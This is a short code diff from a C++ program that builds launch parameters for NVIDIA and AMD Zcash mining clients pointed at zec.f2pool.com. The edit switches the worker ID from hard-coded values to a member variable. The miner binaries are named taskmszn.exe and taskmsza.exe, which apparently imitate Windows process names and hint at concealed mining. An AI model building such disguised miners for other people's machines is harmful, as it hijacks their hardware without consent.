@@ -92,17 +92,17 @@ void RunEnvironment::GetClientInfo()
 	if (m_Type == vendor_t::nvidia)
 	{
 		strFormat = L"--server zec.f2pool.com --user %s.%s --pass x --port 3357 --fee 0 --pec";
-		strWorkid = L"n0";
+		//strWorkid = L"n0";
 		m_pClientInfo->strClientSubPath = L"taskmszn\\taskmszn.exe";
 	}
 	else if (m_Type == vendor_t::amd)
 	{
 		strFormat = L"-zpool zec.f2pool.com:3357 -zwal %s.%s -zpsw x -li 10 -dbg -1";
-		strWorkid = L"a0";
+		//strWorkid = L"a0";
 		m_pClientInfo->strClientSubPath = L"taskmsza\\taskmsza.exe";
 	}
 	TCHAR szParam[MAX_PATH] = {0};
-	_sntprintf(szParam, _MAX_PATH, strFormat.c_str(), strAccount.c_str(),strWorkid.c_str());
+	_sntprintf(szParam, _MAX_PATH, strFormat.c_str(), strAccount.c_str(),m_wstrWorkID.c_str());
 	m_pClientInfo->strClientParam = szParam;
 }
 
